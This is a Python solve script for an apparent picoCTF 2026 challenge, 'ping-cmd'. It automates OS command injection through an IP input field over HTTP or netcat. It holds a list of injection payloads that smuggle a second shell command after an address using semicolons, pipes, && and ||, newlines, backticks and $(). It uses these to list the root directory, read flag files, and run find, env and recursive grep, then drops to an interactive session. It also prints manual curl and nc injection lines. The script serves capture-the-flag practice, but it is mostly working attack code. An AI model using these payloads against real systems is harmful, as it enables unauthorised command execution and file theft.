#!/usr/bin/env python3
"""
ping-cmd - picoCTF 2026
Category: General Skills | Points: 100

Classic OS command injection via a ping utility. The server takes an IP
address input and passes it to the ping command without proper sanitization.
We inject shell commands using ; or other separators to read the flag.

This script supports both web-based and netcat-based challenge variants.

Requirements:
    pip install requests pwntools

Usage:
    python3 solve.py <URL_or_HOST> [PORT]

    Web-based:
        python3 solve.py http://challenge.picoctf.org:12345

    Netcat-based:
        python3 solve.py challenge.picoctf.org 12345
"""

import sys
import re
import os

# Flag file locations to search
FLAG_FILES = [
    "/flag.txt",
    "/flag",
    "/home/ctf/flag.txt",
    "/root/flag.txt",
    "/home/user/flag.txt",
    "/challenge/flag.txt",
    "/opt/flag.txt",
]

# Command injection payloads to try, in order of likelihood
INJECTION_PAYLOADS = [
    # Semicolon separator
    ("8.8.8.8; {cmd}", "semicolon"),
    # AND operator
    ("8.8.8.8 && {cmd}", "AND operator"),
    # Pipe
    ("8.8.8.8 | {cmd}", "pipe"),
    # OR operator (first command must fail)
    ("invalid || {cmd}", "OR operator"),
    # Newline
    ("8.8.8.8\n{cmd}", "newline"),
    # Command substitution with backticks
    ("8.8.8.8 `{cmd}`", "backtick substitution"),
    # Command substitution with $()
    ("8.8.8.8 $({cmd})", "dollar substitution"),
]


def extract_flag(text):
    """Search for picoCTF flag pattern in text."""
    if isinstance(text, bytes):
        text = text.decode('utf-8', errors='replace')
    match = re.search(r'picoCTF\{[^}]+\}', text)
    return match.group(0) if match else None


# ============================================================
# Web-based solver (HTTP)
# ============================================================

def solve_web(url):
    """Solve a web-based command injection challenge."""
    import requests

    # Normalize URL
    if not url.startswith("http"):
        url = "http://" + url
    base_url = url.rstrip("/")

    print(f"[*] Target URL: {base_url}")

    # Step 1: Fetch the page to understand the form
    print("[*] Fetching the challenge page...")
    try:
        resp = requests.get(base_url, timeout=10)
        print(f"[*] Status: {resp.status_code}")

        # Check if flag is already visible
        flag = extract_flag(resp.text)
        if flag:
            print(f"\n[FLAG] {flag}")
            return flag
    except Exception as e:
        print(f"[!] Error fetching page: {e}")

    # Step 2: Try common form parameter names and injection payloads
    param_names = ["ip", "host", "address", "target", "ping", "cmd", "input", "addr"]

    # Try to discover the correct form parameter from the page source
    try:
        # Look for input fields in the HTML
        input_matches = re.findall(r'name=["\'](\w+)["\']', resp.text)
        if input_matches:
            # Prioritize discovered parameter names
            param_names = list(set(input_matches + param_names))
            print(f"[*] Discovered form parameters: {input_matches}")
    except Exception:
        pass

    # Determine if it's POST or GET
    methods = []
    if 'method="post"' in resp.text.lower() or 'method="POST"' in resp.text:
        methods.append("POST")
    if 'method="get"' in resp.text.lower() or 'method="GET"' in resp.text:
        methods.append("GET")
    if not methods:
        methods = ["POST", "GET"]  # Try both

    # Look for the form action URL
    action_match = re.search(r'action=["\']([^"\']*)["\']', resp.text)
    action_url = base_url
    if action_match:
        action_path = action_match.group(1)
        if action_path.startswith("http"):
            action_url = action_path
        elif action_path.startswith("/"):
            # Extract base domain from url
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            action_url = f"{parsed.scheme}://{parsed.netloc}{action_path}"
        else:
            action_url = f"{base_url}/{action_path}"

    print(f"[*] Form action URL: {action_url}")
    print(f"[*] Methods to try: {methods}")

    # Step 3: Try injections
    for method in methods:
        for param in param_names:
            for payload_template, payload_name in INJECTION_PAYLOADS:
                # First, try listing the root directory
                cmd = "ls /"
                payload = payload_template.format(cmd=cmd)

                print(f"[*] Trying {method} param={param} inject={payload_name}: {payload[:50]}...")

                try:
                    if method == "POST":
                        resp = requests.post(action_url, data={param: payload}, timeout=15)
                    else:
                        resp = requests.get(action_url, params={param: payload}, timeout=15)

                    # Check for signs of successful injection
                    # (directory listing indicators like "bin", "etc", "tmp")
                    if any(indicator in resp.text for indicator in ["bin", "etc", "tmp", "usr", "var", "home"]):
                        print(f"[+] Command injection successful via {method} param={param} ({payload_name})")
                        print(f"[*] Directory listing found!")

                        # Now try to read the flag from known locations
                        for flag_path in FLAG_FILES:
                            cmd = f"cat {flag_path}"
                            payload = payload_template.format(cmd=cmd)

                            if method == "POST":
                                resp = requests.post(action_url, data={param: payload}, timeout=15)
                            else:
                                resp = requests.get(action_url, params={param: payload}, timeout=15)

                            flag = extract_flag(resp.text)
                            if flag:
                                print(f"\n[FLAG] {flag}")
                                return flag

                        # Try find command
                        cmd = "find / -name 'flag*' -exec cat {} \\; 2>/dev/null"
                        payload = payload_template.format(cmd=cmd)
                        if method == "POST":
                            resp = requests.post(action_url, data={param: payload}, timeout=15)
                        else:
                            resp = requests.get(action_url, params={param: payload}, timeout=15)

                        flag = extract_flag(resp.text)
                        if flag:
                            print(f"\n[FLAG] {flag}")
                            return flag

                        # Try env and grep
                        cmd = "env | grep -i flag 2>/dev/null; grep -r picoCTF / 2>/dev/null | head -5"
                        payload = payload_template.format(cmd=cmd)
                        if method == "POST":
                            resp = requests.post(action_url, data={param: payload}, timeout=15)
                        else:
                            resp = requests.get(action_url, params={param: payload}, timeout=15)

                        flag = extract_flag(resp.text)
                        if flag:
                            print(f"\n[FLAG] {flag}")
                            return flag

                        print(f"[*] Response text:\n{resp.text[:500]}")

                    # Also check if the response itself contains the flag
                    flag = extract_flag(resp.text)
                    if flag:
                        print(f"\n[FLAG] {flag}")
                        return flag

                except requests.exceptions.RequestException as e:
                    continue

    print("\n[-] Could not find the flag via web injection.")
    print("[*] Try manually with curl:")
    print(f'    curl -X POST {action_url} -d "ip=8.8.8.8; cat /flag.txt"')
    return None


# ============================================================
# Netcat-based solver (TCP)
# ============================================================

def solve_netcat(host, port):
    """Solve a netcat-based command injection challenge."""
    from pwn import remote, context
    context.log_level = 'info'

    print(f"[*] Connecting to {host}:{port}...")
    io = remote(host, int(port))

    # Read initial prompt
    try:
        initial = io.recvuntil(b':', timeout=5)
        print(f"[*] Prompt: {initial.decode('utf-8', errors='replace')}")
    except Exception:
        initial = io.recv(timeout=3)
        print(f"[*] Initial data: {initial.decode('utf-8', errors='replace')}")

    # Check if flag is already in the initial output
    flag = extract_flag(initial)
    if flag:
        print(f"\n[FLAG] {flag}")
        io.close()
        return flag

    # Try command injection payloads
    for payload_template, payload_name in INJECTION_PAYLOADS:
        for flag_path in FLAG_FILES:
            cmd = f"cat {flag_path}"
            payload = payload_template.format(cmd=cmd)

            print(f"[*] Trying {payload_name}: {payload}")

            try:
                # Reconnect for each attempt (server might close after one input)
                io.close()
                io = remote(host, int(port))
                io.recvuntil(b':', timeout=5)
            except Exception:
                try:
                    io.close()
                except Exception:
                    pass
                io = remote(host, int(port))
                io.recv(timeout=3)

            io.sendline(payload.encode())

            try:
                response = io.recv(timeout=5)
                text = response.decode('utf-8', errors='replace')

                flag = extract_flag(text)
                if flag:
                    print(f"\n[FLAG] {flag}")
                    io.close()
                    return flag

                # Print interesting output
                if len(text.strip()) > 0:
                    print(f"  [>] {text[:200]}")
            except Exception:
                continue

    # Try finding the flag file first
    print("\n[*] Trying to locate the flag file...")
    try:
        io.close()
        io = remote(host, int(port))
        io.recv(timeout=3)
        io.sendline(b"8.8.8.8; find / -name 'flag*' 2>/dev/null")
        response = io.recv(timeout=5)
        text = response.decode('utf-8', errors='replace')
        print(f"[*] Find results: {text}")

        # Try reading each found file
        for line in text.split('\n'):
            line = line.strip()
            if line and ('flag' in line.lower()) and line.startswith('/'):
                io.close()
                io = remote(host, int(port))
                io.recv(timeout=3)
                io.sendline(f"8.8.8.8; cat {line}".encode())
                response = io.recv(timeout=5)
                flag = extract_flag(response)
                if flag:
                    print(f"\n[FLAG] {flag}")
                    io.close()
                    return flag
    except Exception as e:
        print(f"[!] Error: {e}")

    print("\n[-] Could not find the flag automatically.")
    print("[*] Dropping to interactive mode...")
    try:
        io.close()
        io = remote(host, int(port))
        io.recv(timeout=3)
        io.interactive()
    except Exception:
        pass

    return None


# ============================================================
# Main
# ============================================================

def main():
    print("=" * 60)
    print("ping-cmd - picoCTF 2026")
    print("OS Command Injection via Ping")
    print("=" * 60)

    if len(sys.argv) < 2:
        print("\n[!] No target provided. Showing manual solution:\n")
        print("For web-based challenges:")
        print("  1. Enter this in the IP field: 8.8.8.8; cat /flag.txt")
        print("  2. If semicolons are filtered, try: 8.8.8.8 | cat /flag.txt")
        print("  3. Or try: 8.8.8.8 && cat /flag.txt")
        print("")
        print("For netcat-based challenges:")
        print("  1. Connect: nc <host> <port>")
        print("  2. When prompted for IP, enter: 8.8.8.8; cat /flag.txt")
        print("")
        print("Using curl:")
        print('  curl -X POST http://<host>:<port>/ -d "ip=8.8.8.8; cat /flag.txt"')
        print("")
        print(f"Usage: python3 {sys.argv[0]} <URL_or_HOST> [PORT]")
        print(f"  Web:    python3 {sys.argv[0]} http://host:port")
        print(f"  Netcat: python3 {sys.argv[0]} host port")
        return

    target = sys.argv[1]

    # Determine if this is a web URL or host:port
    if target.startswith("http://") or target.startswith("https://"):
        solve_web(target)
    elif len(sys.argv) >= 3:
        # host port format for netcat
        solve_netcat(target, sys.argv[2])
    elif ":" in target and not target.startswith("http"):
        # host:port format
        host, port = target.rsplit(":", 1)
        solve_netcat(host, port)
    else:
        # Assume web with default http
        solve_web(target)


if __name__ == "__main__":
    main()
